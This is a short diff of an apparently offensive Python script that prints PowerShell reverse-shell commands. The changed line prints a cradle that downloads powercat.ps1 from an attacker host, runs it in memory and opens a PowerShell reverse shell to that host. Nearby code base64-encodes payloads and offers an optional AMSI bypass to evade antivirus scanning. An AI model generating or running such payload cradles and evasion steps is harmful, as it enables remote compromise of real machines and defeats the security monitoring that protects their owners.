@@ -82,7 +82,7 @@ def main():
     # Powercat cradles
     powercat_encoded = base64.b64encode(powercat.encode('utf-16le')).decode()
     print_separator("POWERCAT", "Powercat (interactive, low character count but flagged ofc)")
-    print(f"IEX(New-Object System.Net.WebClient).DownloadString('http://{lhost}:{staging_port}/powercat.ps1');powercat -c {lhost} -p {lport} -e powershell")
+    print(f"iex(New-Object System.Net.WebClient).DownloadString('http://{lhost}:{staging_port}/powercat.ps1');powercat -c {lhost} -p {lport} -e powershell")
     if not amsi_bypass:
         print("\nAMSI bypass not found. Skipping Powercat with AMSI bypass...")
     else:
